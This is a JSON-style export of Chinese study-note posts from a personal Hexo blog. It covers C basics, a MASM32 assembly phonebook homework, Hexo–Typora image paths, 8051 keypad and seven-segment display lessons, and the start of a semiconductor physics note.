(0C4110Eh) ;还原esp和ebp00C4179D mov esp,ebp 00C4179F pop ebp ;函数执行结束00C417A0 ret 先把栈抬高，清空，用完再还原，可以实现不影响以前的栈 C语言关键字 C语言保留标识符 下划线开始的标识符 标准库函数名 C语言数据类型12345678910111213141516171819202122232425262728293031323334#include&lt;stdio.h&gt;#include&lt;stdbool.h&gt;//C99之前没有布尔类型，要用需要通过typedef的方式自己构造int main()&#123; //int家族 short num0; //2字节 int num1; //4字节 long num2; //8字节，大部分情况下 long = int 都是4字节 long long num3; unsigned short num4; // 无符号短整型 unsigned int num5; unsigned long num6; //字符 char ctmp = 'A'; //此处需要用单引号，双引号是字符串 //浮点型，存小数，也支持科学技术法 float f1;//32位 double f2;//64位 long double f3;//128位 //bool bool ff = true;//1 bool ft = false;//0 //指针 char * pch; //union联合体 //struct结构体 //enum枚举 return 0;&#125; C语言输入输出函数输入函数：scanf(“%?”,temp); 输出函数：printf(“%?”,temp); 示例：输入输出字符串12345678910#include&lt;stdio.h&gt;int main() &#123; int len = 0; char str1[20]; scanf(\"%s\", str1); len = strlen(str1); printf(\"hello world:%s,long:%d\",str1,len); return 0;&#125; 默认情况下scanf被禁用了，因为存在安全问题，需要包含一个宏才能用： 项目–属性–C/C++–预处理器–编辑 把报错里说的宏复制进去 C语言命名规则 由字母，数字，下划线组成 只能以字符和下划线开头，不能用数字开头 匈牙利命名法：变量名前+属性+类型 下划线划分 大驼峰命名：所有单词首字母大写 小驼峰命名：第一个单词首字母小写，其他首字母大写 C语言运算符算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其他运算符 运算符优先级https://baike.baidu.com/item/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/4752611#3 ​ 参考资料","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编作业--电话簿","date":"2020-05-14T15:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编作业--电话簿/","text":"汇编作业–电话簿花了不少时间，不过总算完成这项作业了，虽然不是很完美，但也基本符合要求了，完成过程跟大家分享分享， 个人博客：https://kn0sky.com 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152**项目名称：**汇编语言电话本**项目背景：**基于同学们学习汇编语言后没有练习的问题，特以该项目作为阶段性练习。**项目目的：**熟悉汇编语言编程，练习编程逻辑，熟悉Win32 API调用模式**项目要求：**编写一个具有增删改查功能的电话本，基于控制台。具体要求如下：1. 基本功能：电话本具有姓名与电话号码两项属性，并且使用数据结构作为存储2. 增加功能：插入姓名与电话号码到数据结构的最后。3. 查询功能：输入姓名，以此作为依据，到数据结构中查找，将找到的信息打印到控制台。4. 删除功能：输入姓名或电话号码，以此作为依据，到数据结构中查找，且删除该条信息。5. 修改功能：输入姓名或电话号码，以此作为依据，到数据结构中查找，找到后打印信息，要求输入新的姓名或电话，接受后修改原有条目。 **编写指南：****1.****数组的编写方式**TelephoneNumber dd 30 DUP(?) **2.****结构体的编写方式**Name STRUCT具体成员信息Name ENDS **3.****控制台相关的API**GetStdHandle 获得标准输入输出的窗口句柄SetConsoleTextAttribute是设置控制台字体颜色和背景色CONSOLE_CURSOR_INFO用于存放控制光标信息SetConsoleCursorInfo设置光标的信息GetConsoleScreenBufferInfo取得控制台屏幕信息SetConsoleCursorPosition设置光标位置WriteConsoleOutput直接写输入缓冲区SetConsoleTitle设置控制台的标题ReadConsole 读控制台WriteConsole 写控制台 实现基本功能首先，根据前面所学的知识不能够完成本项目，目前以本项目为最终目标，将目标分解成小目标逐个击破 第一步———-基本功能：电话本具有姓名与电话号码两项属性，并且使用数据结构作为存储 数据结构首先要了解数据结构要怎么弄，我们的数据包括姓名和电话两部分，姓名是字符串，电话是数组，应该先弄清楚这两样东西怎么用 字符串定义一个字符串并通过调用消息框输出： 123456789101112131415161718192021222324.586.model flat,stdcallincludelib user32.libincludelib kernel32.libExitProcess PROTO, dwExitCode:DWORDMessageBoxA PROTO, hWnd:DWORD ,lpText:BYTE ,lpCaption:BYTE ,uType:DWORD.dataname1 db &quot;警告&quot; ,0name2 db &quot;你菜爆了&quot; ,0.codemain proc push 0 lea eax ,name1 push eax lea eax ,name2 push eax push 0 call MessageBoxA add esp,16 call ExitProcessmain ENDPEND main 通过控制台输出： 123456789101112131415.586.model flat, stdcallinclude msvcrt.incincludelib msvcrt.lib.data szText db &#39;Hello World!&#39;, 0.codemain proc invoke crt_printf, addr szText;类似于call，但比call方便，可直接在后面跟参数 mov eax ,eaxmain endpend main 数组定义一个数组赋值并输出到控制台： 1234567891011121314151617181920212223242526.386.model flat, stdcallinclude msvcrt.incincludelib msvcrt.lib.data;定义数组user db 20 dup(0)testext db &quot;hello world!&quot;,0.codemain proc ;给数组赋值 lea edi ,offset user lea esi ,offset testext mov ecx,20 rep movsb ;打印 push offset user call crt_printf mov eax ,eaxmain endpend main 数据结构到这里我们已经会使用字符串和数组了，接下来了解一下如何使用数据结构作为存储。 示例：创建一个结构体，包含两项内容，插入值并输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445.386.model flat, stdcallinclude msvcrt.incincludelib msvcrt.lib.data;定义结构体Contact struct user db 20 dup(0) tel db 20 dup(0)Contact endsperson1 Contact &lt;&gt;person2 Contact &lt;&#39;john&#39;,&#39;12312312312&#39;&gt;tsname db &quot;Li Hua&quot;,0tstel db &quot;12312345678&quot;,0.codemain proc ;给结构体数组赋值 lea edi ,offset person1.tel lea esi ,offset tstel mov ecx ,20 rep movsb lea edi ,offset person1.user lea esi ,offset tsname mov ecx ,20 rep movsb push offset person1.user call crt_printf add esp ,4 push offset person1.tel call crt_printf add esp ,4 mov eax ,eaxmain endpend main 到此，基本功能已经实现，下一步，实现增加功能 实现增加功能增加功能：插入姓名与电话号码到数据结构的最后。 这里要解决两个问题 如何输入数据 如何将数据加到数据结构的最后 输入功能输入一个字符数并输出： 12345678910111213141516171819202122232425.586.model flat ,stdcallinclude msvcrt.incincludelib msvcrt.lib.data;输入格式input_format_str db &quot;%s&quot;,0 ;存放输入的变量inputstr db 0,0.codemain proc push offset inputstr push offset input_format_str call crt_scanf ;输入函数需要两个参数，一个是输入格式，一个用来保存输入的值 add esp,8 invoke crt_printf ,offset inputstr mov eax ,eaxmain endpend main 添加数据函数据此，我们可以用一个变量来计数，来计算数组最后一个位置的偏移量，通过上面的方法来实现添加数据。 初步完成添加数据功能函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485.data;结构体存储名字电话Contact struct user db 20 dup(0) tel db 20 dup(0)Contact ends;定义一个结构体数组存储所有联系人ContactList Contact 100 dup(&lt;&#39;0&#39;&gt;);定义一个临时结构用来传送数据tmpContact Contact &lt;&#39;john&#39;,&#39;123123123123&#39;&gt;;输入格式input_format_str db &quot;%s&quot;,0 ;存放输入的变量inputstr db 20 dup(0);现有数据数count dd 1 dup(0);问候语input_user_text db &quot;请输入联系人姓名：&quot;,0input_tel_text db &quot;请输入联系人电话：&quot;,0.codeaddContact proc ;消息提示1：请输入联系人姓名 push offset input_user_text call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.user mov ecx ,20 rep movsb ;---------------------------------------- ;消息提示2：请输入联系人电话 push offset input_tel_text call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.tel mov ecx ,20 rep movsb ;----------------------------------------- ;保存到数据结构的最后 lea esi ,offset tmpContact lea edi ,offset ContactList ;计算偏移,并移动 mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb ;总数+1 inc count ;返回 retnaddContact endp 实现查询功能查询功能：输入姓名，以此作为依据，到数据结构中查找，将找到的信息打印到控制台。 这里思路就很简单了，我们把我们的联系人数组遍历一遍即可，ebx来接收要循环的次数，edx显示当前已循环的次数，如果到循环次数了，也就是遍历到联系人总数了，就结束循环跳出 12345678910111213141516171819202122232425262728293031323334353637383940414243searchContact proc mov edx ,0 mov ebx ,countl: ;判断循环条件 cmp edx ,ebx jz exit;edx&#x3D;&#x3D;ebx的时候退出 ;获取数组地址 lea esi ,offset ContactList lea edi ,offset s_test_user ;临时用待查询人姓名 ;计算偏移量来选择数组的下一位 mov eax ,sizeof(Contact) imul eax,edx add esi ,eax ;串比较 mov ecx ,20 repe cmpsb ;比较成功了，跳转到s程序，将查询到的信息打印出来 jz s ;比较失败了，edx+1，然后继续查询 inc edx jnz ls: ;edx+1，然后ebx，edx入栈出栈 inc edx push edx push ebx ;invoke会改变ebx，edx的内容 invoke crt_printf ,offset s_test_user pop ebx pop edx ;然后无条件跳转回循环中继续下一次查询 jmp lexit: retnsearchContact endp 增加一个菜单功能已经实现几个功能了，接下来我们可以新增一下菜单功能，让我们的操作看起来更直接一些 思路很简单，就是接收一个输入的值，如果值等于1就走1选项，以此类推即可,这里给出一个例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.data;菜单bookmenu db &quot;电话簿（Console版）v0.1&quot;,endl, &quot;1. 添加数据&quot;,endl, &quot;2. 查询数据&quot;,endl, &quot;3. 修改数据&quot;,endl, &quot;4. 删除数据&quot;,endl, &quot;5. 添加测试用数据&quot;,endl, &quot;6. 退出程序&quot;,endl, &quot;请输入选项:&quot;,0choose db 1 dup(0)chooselist db &quot; 123456&quot;,0.codemenu: ;显示菜单 push offset bookmenu call crt_printf add esp ,4 ;输入选项 push offset choose push offset input_format_str call crt_scanf ;jcc跳转 mov ebx ,1 mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c1 inc ebx;此处省略c2--c5 mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c6 jmp menuc1: inc ebx call addContact jmp menuc6: call ExitProcess 实现修改/删除功能这里就讲个思路，方法与前面大同小异 修改/删除功能是在查询功能的基础之上新增的功能，设置一个修改flag=0，如果从菜单选中修改/删除，则flag=1，思路是通过查询函数查到数据之后，检查flag的值，如果flag=1，则进行修改/删除 删除操作其实就是把要删除的那一个部分用后面的内容覆盖掉就行了 效果图 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589.586.model flat ,stdcallinclude msvcrt.incincludelib msvcrt.libincludelib user32.libincludelib kernel32.libExitProcess PROTO, dwExitCode:DWORD.data;清零用zero db 20 dup(0);换行符endl EQU &lt;0dh,0ah&gt;;冒号maohao db &quot;:&quot;,0;结构体存储名字电话Contact struct user db 20 dup(0) tel db 20 dup(0)Contact ends;定义一个结构体数组存储所有联系人ContactList Contact 100 dup(&lt;&#39;0&#39;&gt;);保存结构体数组查询出来的信息s_user db 20 dup(0)s_tel db 20 dup(0);定义一个临时结构用来传送数据tmpContact Contact &lt;&#39;john&#39;,&#39;123123123123&#39;&gt;;默认数据tmpContact2 Contact &lt;&#39;chill&#39;,&#39;123123123123&#39;&gt;tmpContact3 Contact &lt;&#39;bob&#39;,&#39;123123123123&#39;&gt;;测试用查找字符s_test_user db 20 dup(0);输入格式input_format_str db &quot;%s&quot;,0 ;存放输入的变量inputstr db 20 dup(0);查询用户名变量searchstr db 20 dup(0);现有数据数count dd 1 dup(0);修改数据flagxg_flag dd 1 dup(0);删除数据flagsc_flag dd 1 dup(0);分割线line db &quot;----------------------------------&quot;,endl,0;问候语input_user_text db &quot;请输入联系人姓名：&quot;,endl,0input_tel_text db &quot;请输入联系人电话：&quot;,endl,0search_info db &quot;查询到信息如下：&quot;,endl,0edit_user db endl,&quot;请输入新的用户名：&quot;,endl,0edit_tel db &quot;请输入新的电话号码：&quot;,endl,0search_success db &quot;查询成功&quot;,endl,0edit_success db &quot;修改成功&quot;,endl,0add_success db &quot;添加成功&quot;,endl,0rm_success db &quot;删除成功&quot;,endl,0addtmp_success db &quot;添加临时数据成功,临时数据为:john、chill、bob&quot;,endl,0;菜单bookmenu db &quot;电话簿（Console版）v0.1&quot;,endl, &quot;1. 添加数据&quot;,endl, &quot;2. 查询数据&quot;,endl, &quot;3. 修改数据&quot;,endl, &quot;4. 删除数据&quot;,endl, &quot;5. 添加测试用数据&quot;,endl, &quot;6. 退出程序&quot;,endl, &quot;请输入选项:&gt;&quot;,0choose db 1 dup(0)chooselist db &quot; 123456&quot;,0.codeaddContact proc ;消息提示1：请输入联系人姓名 push offset input_user_text call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.user mov ecx ,20 rep movsb ;inputstr清零 lea esi ,offset zero lea edi ,offset inputstr mov ecx ,20 rep movsb ;---------------------------------------- ;消息提示2：请输入联系人电话 push offset input_tel_text call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.tel mov ecx ,20 rep movsb ;inputstr清零 lea esi ,offset zero lea edi ,offset inputstr mov ecx ,20 rep movsb ;----------------------------------------- ;保存到数据结构的最后 lea esi ,offset tmpContact lea edi ,offset ContactList ;计算偏移,并移动 mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb push offset add_success call crt_printf add esp,4 ;总数+1 inc count ;tmpContact 清零 lea esi ,offset zero lea edi ,offset tmpConTact.user mov ecx ,20 rep movsb lea esi ,offset zero lea edi ,offset tmpConTact.tel mov ecx ,20 rep movsb ;返回 retnaddContact endpadd_default_data proc ;默认添加的数据 lea esi ,offset tmpContact lea edi ,offset ContactList mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb inc count lea esi ,offset tmpContact2 lea edi ,offset ContactList mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb inc count lea esi ,offset tmpContact3 lea edi ,offset ContactList mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb inc count retnadd_default_data endpsearchContact proc ;消息提示1：请输入待查询联系人姓名 push offset input_user_text call crt_printf add esp,4 ;输入 push offset searchstr push offset input_format_str call crt_scanf add esp,8 mov edx ,0 mov ebx ,countl: cmp edx ,ebx jz exit lea esi ,offset ContactList lea edi ,offset searchstr mov eax ,sizeof(Contact) imul eax,edx add esi ,eax mov ecx ,20 repe cmpsb jz s inc edx jnz ls: inc edx push edx push ebx push eax ;将查到的数据存起来 sub esi ,20 lea edi ,offset tmpContact.user mov ecx ,20 rep movsb lea edi ,offset tmpContact.tel mov ecx ,20 rep movsb invoke crt_printf ,offset search_info invoke crt_printf ,offset tmpContact.user invoke crt_printf ,offset maohao invoke crt_printf ,offset tmpContact.tel ;检测是否需要修改 lea edi ,offset xg_flag lea esi ,offset chooselist add esi ,1 mov ecx ,1 repe cmpsb jz xg ;检测是否需要删除 lea edi ,offset sc_flag lea esi ,offset chooselist add esi ,1 mov ecx ,1 repe cmpsb jz sc pop eax pop ebx pop edx jmp lexit: ;inputstr清零 lea esi ,offset zero lea edi ,offset searchstr mov ecx ,20 rep movsb retnxg: pop eax call editContact pop ebx pop edx jmp lsc: pop eax call rmContact pop ebx pop edx jmp lsearchContact endpeditContact proc push eax ;偏移量入栈 ;消息提示1：请输入新的联系人姓名 push offset edit_user call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.user mov ecx ,20 rep movsb ;inputstr清零 lea esi ,offset zero lea edi ,offset inputstr mov ecx ,20 rep movsb ;---------------------------------------- ;消息提示2：请输入新的联系人电话 push offset edit_tel call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.tel mov ecx ,20 rep movsb ;inputstr清零 lea esi ,offset zero lea edi ,offset inputstr mov ecx ,20 rep movsb ;----------------------------------------- ;使用新的联系人覆盖老的联系人 lea esi ,offset tmpContact lea edi ,offset ContactList ;取出偏移量 pop eax add edi ,eax mov ecx ,40 rep movsb ;tmpContact 清零 lea esi ,offset zero lea edi ,offset tmpConTact.user mov ecx ,20 rep movsb lea esi ,offset zero lea edi ,offset tmpConTact.tel mov ecx ,20 rep movsb ;----------------------------------------- retneditContact endprmContact proc ;获取要删除的地址 lea edi ,offset ContactList add edi ,eax ;获取要删除的地址之后的地址 lea esi ,offset ContactList add esi ,eax add esi ,sizeof(Contact) ;获得要删除的地址之后的地址位数 mov ecx ,count imul ecx,sizeof(Contact) sub ecx,eax ;覆盖 rep movsb dec count push offset rm_success call crt_printf add esp,4 retnrmContact endpmain procmenu: ;显示菜单 push offset bookmenu call crt_printf add esp ,4 ;输入选项 push offset choose push offset input_format_str call crt_scanf ;jcc跳转 mov ebx ,1 mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c1 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c2 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c3 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c4 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c5 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c6 jmp menu;增加数据c1: inc ebx call addContact push offset line call crt_printf add esp,4 jmp menu;查找数据c2: inc ebx call searchContact push offset search_success call crt_printf add esp,4 push offset line call crt_printf add esp,4 jmp menu;修改数据c3: inc ebx lea edi ,offset xg_flag lea esi ,chooselist add esi ,1 mov ecx ,1 rep movsb call searchContact ;把flag变回去 lea edi ,offset xg_flag lea esi ,chooselist add esi ,0 mov ecx ,1 rep movsb push offset edit_success call crt_printf add esp,4 push offset line call crt_printf add esp,4 jmp menu;删除数据c4: inc ebx lea edi ,offset sc_flag lea esi ,chooselist add esi ,1 mov ecx ,1 rep movsb call searchContact ;把flag变回去 lea edi ,offset sc_flag lea esi ,chooselist add esi ,0 mov ecx ,1 rep movsb push offset line call crt_printf add esp,4 jmp menu;添加临时数据c5: inc ebx call add_default_data push offset addtmp_success call crt_printf add esp,4 push offset line call crt_printf add esp,4 jmp menu;退出程序c6: call ExitProcessmain endpend main 遇到的问题及其解决方案0X01 找不到msvcrt.inv文件 下载MASM SDK文件（http://www.masm32.com/） 安装，C盘装不上装其他盘也可以 在masm32文件夹下找到lib目录中找到msvcrt.lib文件，在include目录中找到msvcrt.inc文件，将它们复制到项目目录下 参考资料 VS常见错误之一：error LNK2019: 无法解析的外部符号 安装masm32 问题：Delete Operation of EXE file has Failed!的解决办法 汇编实现电话本 Tips asm基础–汇编中的结构体 汇编语言LEA和OFFSET的区别 汇编语言：movsb/w/d","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"hexo联动Typora","date":"2020-05-13T10:40:49.000Z","path":"wiki/折腾笔记/博客搭建/hexo联动Typora/","text":"hexo联动Typora 插入图片使用Typora这款软件来写作hexo博客的时候，经常遇到了一个烦人的问题，那就是插入图片的时候，hexo要用的图片路径和Typora写作用的图片路径不一样 有两条思路来解决这个问题 将hexo和Typora存放图片的路径设置为相同的 改变hexo或者Typora读取图片的路径 第一种方法网上很好搜到，就不说了，这里谈谈第二种方法 我这里hexo设置了，hexo-post-asset，好像是这个名字，反正就是图片会从同文章名文件夹里读取 在每个文件的YAML里添加如下行： 1typora-root-url: 装图片的文件夹名 然后文章内插入图片,例如： 1234可行：![image-20200513185515393](image-20200513185515393.png)不可行:![image-20200513185515393](/image-20200513185515393.png) 如图： 这样图片既可以在hexo直接显示，也可以在typora编辑器上看到","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"博客搭建","slug":"折腾笔记/博客搭建","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"51单片机入门03--按键","date":"2020-05-13T05:27:19.000Z","path":"wiki/学习笔记/51单片机学习笔记/51单片机入门03--按键/","text":"51单片机入门03–按键键盘的原理 按键需要一个上拉电阻，当没有按下去的时候，由于上拉电阻，左边的端口是高电平，当按键闭合后，左边的端口会变成低电平 这里按下的瞬间存在一个电平抖动的问题，所以需要消除抖动： 硬件消抖：锁存器 软件消抖：延时程序 分类分为两类： 独立式键盘 每个按键占用一根并口线 用于键位较少的情况，处理简单 矩阵键盘 键位分布在行列交叉点上 占用并口少，键位越多越明显 后面将以示例介绍两种键盘 键位的识别对于独立式键盘：直接识别对应并口即可 对于矩阵键盘： 先检测键盘上是否有键被按下 然后识别按下的是哪一个按键 示例：每次按下按键试数码管数字加一（独立键盘）原理图： P1~P3自带上拉电阻，P0需要自己加上拉电阻 代码： 1234567891011121314151617181920212223242526272829#include \"reg51.h\"unsigned char s[]=&#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f,0x6f&#125;;sbit key0=P0^0;unsigned char num=0;flag=0;//程序消抖void key()&#123; if(key0==0&amp;&amp;flag==0)&#123; //判断按键是否按下 flag=1; &#125; if(key0==1&amp;&amp;flag==1)&#123; //判断按键是否从按下状态中弹起，如果是，则实现功能 num++; flag=0; &#125;&#125;void seg()&#123; if(num&gt;9)num=0; P2 = s[num];&#125;void main()&#123; while(1)&#123; key(); seg(); &#125;&#125; 示例：按下不同的按键显示不同的数字（矩阵键盘）原理图： 如何判断按下的按键是哪个按键？ 123456L3 L2 L1 L0 H3 H2 H1 H0 hex0 0 0 0 1 1 1 1 0x0f 默认情况0 0 0 0 1 1 1 0 0x0e 判断按下按键的行，H01 1 1 1 0 0 0 0 0xf0 默认情况取反1 1 0 1 0 0 0 0 0xd0 判断按下按键的列，L1将第二行和第四行的值相加：0xde 即为(H0,L1)按键在P2中的值 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142#include \"reg51.h\"unsigned char s[]=&#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f,0x6f&#125;;unsigned char num=99;void delay(int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void key_scan()&#123; unsigned char tmp=0,tmp0=0,tmp1=0; //判断按下去的按键 P1=0x0f; if(P1!=0x0f)&#123; delay(20);//还是这样消除抖动最方便 tmp0 = P1; P1=0xf0; if(P1!=0xf0) tmp1 = P1; &#125; tmp = tmp1+tmp0; //实现功能 if (tmp == 0xee)num=0; //display 0 if (tmp == 0xde)num=1; //display 1&#125;void display()&#123; P2=s[num];&#125;void main()&#123; while(1)&#123; key_scan(); display(); &#125;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"51单片机学习笔记","slug":"学习笔记/51单片机学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"51单片机入门02--数码管","date":"2020-05-12T09:27:19.000Z","path":"wiki/学习笔记/51单片机学习笔记/51单片机入门02--数码管/","text":"51单片机入门02–数码管实验环境 Protues Keil 数码管结构和原理原理图： 不同字符对应16进制断码为： 数码管的显示方式显示方式分为静态显示和动态显示，其中： 静态显示 每个数码管的段选线与一组I/O接口线连接 每个数码管一直显示 公共端接地或电源 动态显示 所有数码管的段选线与一组I/O接口线并联 每个数码管的公共端由一根I/O线控制 显示为逐个显示 只显示一位的话，那就不做区分了，因为都一样 示例1：循环显示0~9（静态显示）电路图及源码 代码如下：通过数组来控制依次显示的字符 1234567891011121314151617181920212223#include \"reg51.h\"unsigned char s[]=&#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f&#125;;void delay(int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void seg()&#123; int i=0; for(i=0;i&lt;10;i++)&#123; P2 = s[i]; delay(1000); &#125;&#125;void main()&#123; while(1)&#123; seg(); &#125;&#125; 示例2：用多位数码管显示selph字样（动态显示）电路图&amp;效果图如下： 代码如下：通过一个数组来定义显示的字符，另一个数组来定义显示的顺序，从而实现动态显示 123456789101112131415161718192021222324252627#include \"reg51.h\"unsigned char anode[]=&#123;0x92,0x86,0xc7,0x8c,0x89&#125;;//SELPHunsigned char nu[]=&#123;0x01,0x02,0x04,0x08,0x10&#125;;void delay(int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void seg()&#123; int i=0; for(i=0;i&lt;5;i++)&#123; P3 = nu[i];//P2和P3的顺序不能反，不然残留的内容会出问题 P2 = anode[i]; delay(10);//利用视觉残留产生同时显示多位不同的字符的效果 &#125;&#125;void main()&#123; while(1)&#123; seg(); &#125;&#125; 简化版电路图&amp;效果图： 这里使用74LS137译码器(74LS138也可以)进行译码操作（功能表及使用方法自行百度），通过P3.1-P3.3 的3个端口来表示全部8位的内容，有效节约了单片机的端口使用。 这里使用的是共阴的数码管，如果使用共阳则需要在译码器的8个输出端口加一个反相器 代码实现： 123456789101112131415161718192021222324252627#include \"reg51.h\"unsigned char cathode[]=&#123;0x6d,0x79,0x38,0x73,0x76&#125;;unsigned char ym[]=&#123;0x00,0x01,0x02,0x03,0x04&#125;;void delay(int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void seg()&#123; int i=0; for(i=0;i&lt;5;i++)&#123; P3 = ym[i]; P2 = cathode[i]; delay(5); &#125;&#125;void main()&#123; while(1)&#123; seg(); &#125;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"51单片机学习笔记","slug":"学习笔记/51单片机学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"半导体物理01--能带理论","date":"2020-04-26T14:37:19.000Z","path":"wiki/学习笔记/半导体物理学习笔记/半导体物理01--能带理论/","text":"半导体物理01 – 能带理论认识半导体半导体的主要特征：电阻率可在很大范围内变化 半导体的分类： 元素半导体（单质，比如Si、Ge） 化合物半导体（比如：GaAs、InP） 固溶半导体（混合晶体） 非晶态半导体 有机半导体 半导体的晶格结构： 金刚石结构（共价键 | Si、Ge） 闪锌矿结构（混合键） 纤锌矿结构（混合键） NaCl结构（共价键） 能带理论原子中的电子状态–能级电子运动处于量子态，要完全描述电子的运动需要4个量子数（唯一确定）： 主量子数n（主能级）：表征量子态具有的能量大小，n=1,2,3… 角量子数l（次能级）：表征电子运动的角动量大小， l=0,1,2,3… 磁量子数m：决定轨道角动量在空间的方位，m=0,±1,±2… 自旋量子数s：决定自旋角动量在空间的方位，s=±1/2 主能级n的值决定有多少次能级l 次能级轨道依次为s p d f 磁量子数m和次能级轨道数有关，后面的轨道比前面的轨道m多2 自旋量子数说明电子有两种自旋方向 简并度：指量子态数（由对应能级的磁量子数决定） 